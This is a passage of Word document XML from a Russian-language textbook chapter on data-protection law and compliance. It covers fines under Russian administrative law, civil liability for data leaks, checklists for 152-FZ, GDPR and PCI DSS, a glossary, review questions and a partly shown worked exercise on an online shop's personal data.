    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Административная ответственность (Россия)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Статья КоАП РФ | Нарушение | Штраф (физлица / юрлица) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|----------------|-----------|---------------------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>13.11</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Нарушение 152-ФЗ (ПДн) | ₽3,000-5,000 / </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>₽50,000-300,000</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>13.11.1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Неуведомление Роскомнадзора | ₽1,000-2,000 / </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>₽30,000-50,000</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>13.12</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Нарушение 187-ФЗ (КИИ) | — / </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>₽100,000-500,000</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>13.15</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Злоупотребление свободой массовой информации | ₽3,000-5,000 / </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>₽30,000-50,000</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Гражданская ответственность</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Если утекли данные</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, пользователь может </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>подать в суд</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> на компанию и требовать </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>компенсацию морального вреда</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (ст. 151, 1101 ГК РФ).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Размер компенсации</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: обычно </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>₽5,000 - ₽100,000</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> на одного пострадавшего (но может быть больше, если докажешь серьёзный ущерб).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: В 2022 году </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сбербанк</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> выплатил </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>₽5,000</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> клиенту за утечку данных (суд Москвы).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Если пострадали миллионы</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> → коллективный иск → катастрофа для компании.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.7.6. Практические рекомендации: Как соблюдать законы и не огрести штраф</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Чеклист для компании (минимум для соблюдения 152-ФЗ)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Организационные меры</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[ ] Назначить **ответственного за ПДн** (DPO)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[ ] Разработать **Политику обработки ПДн** (документ)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[ ] Уведомить **Роскомнадзор** (форма на сайте)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[ ] Получить **согласие** пользователей (галочка на сайте)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[ ] Составить **перечень ПДн** (что собираем, зачем, где хранится)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[ ] Определить **уровень защищённости** (УЗ-1/2/3/4)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[ ] Обучить **сотрудников** (как работать с ПДн)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[ ] Подписать **NDA** с сотрудниками</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Технические меры</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[ ] **Шифрование** (AES-256 для БД, TLS 1.3 для передачи)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[ ] **Разграничение доступа** (RBAC, принцип наименьших привилегий)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[ ] **Антивирус** (обновлять сигнатуры ежедневно)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[ ] **Firewall** (блокировать всё, кроме нужных портов)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[ ] **Резервное копирование** (ежедневно, правило 3-2-1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[ ] **Журналирование** (кто что открывал, хранить 1 год)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[ ] **Физическая защита** (закрытая серверная, видеонаблюдение)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[ ] **Патчинг** (обновлять системы в течение 30 дней после выхода патча)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Чеклист для GDPR (если работаете с EU)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[ ] Назначить **DPO** (Data Protection Officer)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[ ] Разработать **Privacy Policy** (политика конфиденциальности на сайте)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[ ] Получить **явное согласие** (галочка, НЕ pre-checked)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[ ] Реализовать **право на забвение** (кнопка "Удалить мой аккаунт")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[ ] Реализовать **право на переносимость** (экспорт данных в JSON/CSV)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[ ] Подписать **DPA** (Data Processing Agreement) с подрядчиками</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[ ] Уведомлять о **утечках в течение 72 часов**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[ ] Проводить **DPIA (Data Protection Impact Assessment)** для рискованных проектов (например, facial recognition)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Чеклист для PCI DSS (если принимаете карты)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[ ] **Не хранить CVV** (3 цифры на обороте карты) — **КАТЕГОРИЧЕСКИ ЗАПРЕЩЕНО**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[ ] Шифровать **PAN** (Primary Account Number — номер карты)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[ ] Использовать **токенизацию** (заменить номер карты на токен, отправлять платёжному шлюзу)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[ ] **TLS 1.2+** для всех транзакций</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[ ] **Firewall** (сегментация сети: изолировать payment processing от остальной сети)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[ ] **Антивирус** (обновлять ежедневно)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[ ] **Патчинг** (обновлять в течение 30 дней)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[ ] **Разграничение доступа** (только бухгалтерия видит транзакции)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[ ] **Логирование** (хранить 1 год)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[ ] **Пентест** (ежегодно, нанять QSA)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>[ ] **Сканирование уязвимостей** (квартально, например, Nessus, OpenVAS)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Лайфхак</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Используй </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>платёжный шлюз</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Stripe, PayPal, Яндекс.Касса, CloudPayments) → они берут на себя соответствие PCI DSS (ты просто отправляешь пользователя на их страницу, они возвращают токен).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.7.7. Ключевые термины и определения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Персональные данные (ПДн)** — информация, относящаяся к прямо или косвенно определённому физическому лицу.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**152-ФЗ** — федеральный закон "О персональных данных" (Россия, 2006).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**187-ФЗ** — федеральный закон "О безопасности критической информационной инфраструктуры" (Россия, 2017).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**GDPR (General Data Protection Regulation)** — регламент ЕС о защите персональных данных (2018).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**HIPAA (Health Insurance Portability and Accountability Act)** — закон США о защите медицинских данных (1996).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**PCI DSS (Payment Card Industry Data Security Standard)** — стандарт защиты данных платёжных карт.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**ФСТЭК** — Федеральная служба по техническому и экспортному контролю (регулятор ИБ в России).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Класс защищённости** — уровень требований к защите автоматизированной системы (1Г, 1Д, 1К, 2Б, 3А).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Уровень защищённости (УЗ-1/2/3/4)** — классификация ПДн по требованиям защиты (Приказ ФСТЭК №21).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**ISO 27001** — международный стандарт управления информационной безопасностью (ISMS).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**NIST Cybersecurity Framework** — фреймворк кибербезопасности (США): Identify, Protect, Detect, Respond, Recover.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**CIS Controls** — 18 критических контролей безопасности (приоритизированные меры защиты).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**DPO (Data Protection Officer)** — ответственный за защиту персональных данных.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Сертификация СЗИ** — подтверждение соответствия средств защиты информации требованиям ФСТЭК.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**КИИ (Критическая информационная инфраструктура)** — объекты, нарушение работы которых может привести к тяжким последствиям (электростанции, банки, больницы).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Privacy by Design** — принцип встраивания защиты данных в систему с самого начала (а не "прикручивания потом").</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Право на забвение** — право пользователя потребовать удаления своих данных (GDPR, ст. 17).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Data Breach Notification** — обязанность уведомить регулятора об утечке данных (GDPR: 72 часа, 152-ФЗ: без чётких сроков).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.7.8. Контрольные вопросы и практические задачи</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Теоретические вопросы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**152-ФЗ**: Что такое персональные данные? Приведите 5 примеров. Что такое "специальные категории" ПДн?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Уровни защищённости**: В чём разница между УЗ-1 и УЗ-4? Какие меры защиты требуются для УЗ-1?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**GDPR**: Какие штрафы предусмотрены за нарушение GDPR? Приведите пример (компания + сумма штрафа).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**187-ФЗ**: Что такое КИИ? Приведите 3 примера объектов КИИ. Какой срок для уведомления о компьютерных инцидентах?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Уголовная ответственность**: По какой статье УК РФ могут осудить за взлом сайта? Какое максимальное наказание?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**PCI DSS**: Почему запрещено хранить CVV-код? Какие данные карты можно хранить (с шифрованием)?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**ISO 27001**: Сколько контролей в Annex A? Назовите 5 категорий контролей.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**NIST Cybersecurity Framework**: Назовите 5 функций фреймворка. Объясните, в чём разница между "Detect" и "Respond".</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Классы защищённости АС**: Какой класс требуется для банка? Для системы с гостайной?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Право на забвение**: Что это такое? В каких законах/стандартах прописано?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Практические задачи</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача 1: Классификация ПДн</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Вы разрабатываете </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>интернет-магазин</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Россия). Собираете следующие данные:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>ФИО, email, телефон, адрес доставки</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Номер банковской карты (для оплаты)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>История заказов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>500,000 зарегистрированных пользователей</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вопросы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Какой **уровень защищённости** (УЗ-1/2/3/4) требуется?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Нужно ли уведомлять **Роскомнадзор**?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Какие **технические меры** защиты нужны (минимум 5)?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Можно ли хранить **CVV-код**? Как правильно обработать платёж по карте?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Уровень УЗ-2**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Количество субъектов: 500,000 (&gt; 100,000)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Категория ПДн: обычные (ФИО, email) + финансовые (карты относятся к "иным" ПДн)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>По Приказу ФСТЭК №21: 100,000-1,000,000 субъектов + обычные ПДн = **УЗ-2**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Да**, нужно уведомить Роскомнадзор (обязательно для всех операторов ПДн).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Технические меры** (для УЗ-2):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Шифрование БД (AES-256)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>TLS 1.3 для передачи данных</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Разграничение доступа (RBAC: админы, менеджеры, клиенты)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Антивирус (Kaspersky, Dr.Web)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Firewall (закрыть все порты, кроме 443/80)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Резервное копирование (ежедневно, правило 3-2-1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Журналирование (логи доступа к БД, хранить 1 год)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Нет, CVV хранить КАТЕГОРИЧЕСКИ ЗАПРЕЩЕНО** (PCI DSS).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Правильный подход</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Использовать **платёжный шлюз** (Яндекс.Касса, CloudPayments, Stripe)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пользователь вводит карту на **странице шлюза** (не на твоём сайте)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Шлюз возвращает **токен** (например, `tok_1A2B3C4D`) → сохраняешь токен (не номер карты)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Для повторного платежа отправляешь токен шлюзу</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Альтернатива</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Если хочешь хранить карты сам → нужен </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>PCI DSS Level 1</w:t>
      </w:r>
      <w:r>
